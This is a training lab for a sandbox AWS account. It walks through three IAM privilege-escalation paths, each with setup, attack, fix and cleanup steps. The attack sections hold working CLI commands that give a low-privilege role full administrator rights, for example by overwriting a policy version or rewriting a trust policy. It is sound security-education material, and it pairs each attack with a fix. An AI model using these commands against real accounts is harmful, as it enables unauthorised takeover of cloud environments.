# Lab 9: Privilege escalation paths beyond PassRole

**Goal:** practise three more IAM privilege-escalation primitives so you can name
several paths in an interview, not just `PassRole`. Each is deployable in a single
sandbox account.

**Deployable?** Yes, all three. Each uses a low-privilege assumable role that escalates
itself, mirroring Lab 3's structure.

## The paths covered

1. **`iam:CreatePolicyVersion`** — overwrite a managed policy the attacker is allowed
   to version, setting it as default → instant new permissions.
2. **`iam:UpdateAssumeRolePolicy`** — rewrite a powerful role's trust policy so the
   attacker can assume it.
3. **`iam:AttachUserPolicy` / `AttachRolePolicy`** — attach `AdministratorAccess`
   directly (the simplest path if allowed).

> Reference: Rhino Security Labs documented ~20 IAM escalation methods. Know 4–5 by
> name and the fix pattern (scope the IAM action by resource, or don't grant it).

## Common setup

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

cat > trust-root.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::${ACCOUNT_ID}:root" },
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role --role-name EscalRole --assume-role-policy-document file://trust-root.json
aws configure set role_arn arn:aws:iam::${ACCOUNT_ID}:role/EscalRole --profile escal
aws configure set source_profile default --profile escal
```

---

## Path 1: CreatePolicyVersion

### Setup — a managed policy the role can version, plus permission to do so

```bash
cat > weak-policy.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow", "Action": "s3:ListAllMyBuckets", "Resource": "*" }] }
EOF
aws iam create-policy --policy-name VersionMe --policy-document file://weak-policy.json

cat > escal1.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow",
      "Action": "iam:CreatePolicyVersion",
      "Resource": "arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe" }
  ]
}
EOF
aws iam put-role-policy --role-name EscalRole --policy-name Escal1 --policy-document file://escal1.json

# Attach VersionMe to the role so its permissions actually apply to EscalRole
aws iam attach-role-policy --role-name EscalRole \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe
```

### Attack — overwrite the policy with admin, set as default

```bash
cat > admin-version.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow", "Action": "*", "Resource": "*" }] }
EOF

aws iam create-policy-version --profile escal \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe \
  --policy-document file://admin-version.json \
  --set-as-default

# Prove escalation: a call that needs admin now works
sleep 10
aws iam list-users --profile escal
```

### Fix
Never grant `iam:CreatePolicyVersion` on a policy that is (or could become) attached to
the grantee. Scope it away from policies that govern the principal, or don't grant it.

### Reset for next path

```bash
aws iam detach-role-policy --role-name EscalRole \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe
aws iam delete-role-policy --role-name EscalRole --policy-name Escal1
# delete non-default versions then the policy
for v in $(aws iam list-policy-versions --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe \
  --query 'Versions[?IsDefaultVersion==`false`].VersionId' --output text); do
  aws iam delete-policy-version --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe --version-id $v
done
aws iam delete-policy --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/VersionMe
```

---

## Path 2: UpdateAssumeRolePolicy

### Setup — a powerful target role + permission to rewrite trust policies

```bash
# Target admin role, initially trusting nobody useful
cat > empty-trust.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::${ACCOUNT_ID}:root" },
    "Action": "sts:AssumeRole",
    "Condition": { "StringEquals": { "sts:ExternalId": "nobody-has-this" } } }] }
EOF
aws iam create-role --role-name TargetAdmin --assume-role-policy-document file://empty-trust.json
aws iam attach-role-policy --role-name TargetAdmin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

cat > escal2.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow",
    "Action": "iam:UpdateAssumeRolePolicy",
    "Resource": "arn:aws:iam::${ACCOUNT_ID}:role/TargetAdmin" }] }
EOF
aws iam put-role-policy --role-name EscalRole --policy-name Escal2 --policy-document file://escal2.json
```

### Attack — rewrite the trust policy to allow EscalRole, then assume it

```bash
cat > new-trust.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::${ACCOUNT_ID}:role/EscalRole" },
    "Action": "sts:AssumeRole" }] }
EOF

aws iam update-assume-role-policy --profile escal \
  --role-name TargetAdmin --policy-document file://new-trust.json
sleep 10

aws sts assume-role --profile escal \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/TargetAdmin \
  --role-session-name pwned --query AssumedRoleUser.Arn
```

Success = the low-priv role can now assume an admin role.

### Fix
Treat `iam:UpdateAssumeRolePolicy` as highly privileged; never grant it on roles more
powerful than the grantee. Protect admin roles' trust policies with an SCP.

### Reset

```bash
aws iam delete-role-policy --role-name EscalRole --policy-name Escal2
aws iam detach-role-policy --role-name TargetAdmin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role --role-name TargetAdmin
```

---

## Path 3: AttachRolePolicy (the simplest)

### Setup

```bash
cat > escal3.json <<EOF
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow",
    "Action": "iam:AttachRolePolicy",
    "Resource": "arn:aws:iam::${ACCOUNT_ID}:role/EscalRole" }] }
EOF
aws iam put-role-policy --role-name EscalRole --policy-name Escal3 --policy-document file://escal3.json
```

### Attack — attach admin to itself

```bash
aws iam attach-role-policy --profile escal \
  --role-name EscalRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
sleep 10
aws iam list-users --profile escal   # now works
```

### Fix
`iam:AttachRolePolicy`/`AttachUserPolicy` without a `PermissionsBoundary` condition is a
direct escalation. Require a boundary via the `iam:PermissionsBoundary` condition key,
or don't grant the action.

### Reset + full cleanup

```bash
aws iam detach-role-policy --role-name EscalRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null
aws iam delete-role-policy --role-name EscalRole --policy-name Escal3 2>/dev/null
aws iam delete-role --role-name EscalRole
rm -f trust-root.json weak-policy.json escal1.json admin-version.json \
      empty-trust.json escal2.json new-trust.json escal3.json
```

Then remove the `[profile escal]` section from `~/.aws/config`.

## Interview talking points

- Name several escalation primitives: `PassRole`, `CreatePolicyVersion`,
  `UpdateAssumeRolePolicy`, `AttachRole/UserPolicy`, `PutRolePolicy`,
  `CreateLoginProfile`/`UpdateLoginProfile`, `CreateAccessKey` on another user.
- The unifying idea: **any permission that can modify IAM is potentially admin.** Grant
  IAM-write actions narrowly, scoped by resource, ideally gated by a permissions
  boundary condition.
- Find these proactively with **PMapper** or **Cloudsplaining**; detect them via
  CloudTrail on the IAM-write API calls.
